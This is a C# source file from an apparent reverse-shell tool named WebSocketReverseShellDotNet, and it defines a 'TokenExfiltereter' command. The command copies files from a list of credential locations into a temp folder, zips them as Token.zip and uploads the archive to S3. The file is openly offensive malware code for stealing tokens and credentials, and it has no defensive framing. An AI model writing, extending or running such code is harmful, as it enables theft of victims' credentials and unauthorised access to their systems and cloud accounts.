using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class TokenExfiltereter : Command
    {
        public string ExecuteCommand(string command)
        {
            String path = createFolderStructure();

            FileInfo? zipFile = createTokenZipFile(path);
            
            if (zipFile != null && zipFile.Exists)
            {
                return S3Uploadutil.UploadToS3(zipFile);
            }
            
            return "Token File Was Not Created. Because tokens were not found";
        }

        private string createFolderStructure()
        {
            string path = $"{OSUtil.GetSystemTempDir}{Constants.EXFILTRATE_FOLDER}";
            Directory.CreateDirectory(path);



            return path;
        }

        private static FileInfo? createTokenZipFile(String destDir)
        {
            List<String> listOfFilesToZip = new List<string>();
            

            for (int i = 0; i < Constants.LIST_OF_CRED_LOCATIONS.Length; i++)
            {
                String tokenFile = OSUtil.CopyFileWithNumberPreAppended(
                    Constants.LIST_OF_CRED_LOCATIONS[i], destDir, i );
                if (!string.IsNullOrWhiteSpace(tokenFile))
                {
                    listOfFilesToZip.Add(tokenFile);
                }

            }
            
            return OSUtil.ZipFiles(listOfFilesToZip, destDir, "Token.zip");
        }

    }
}
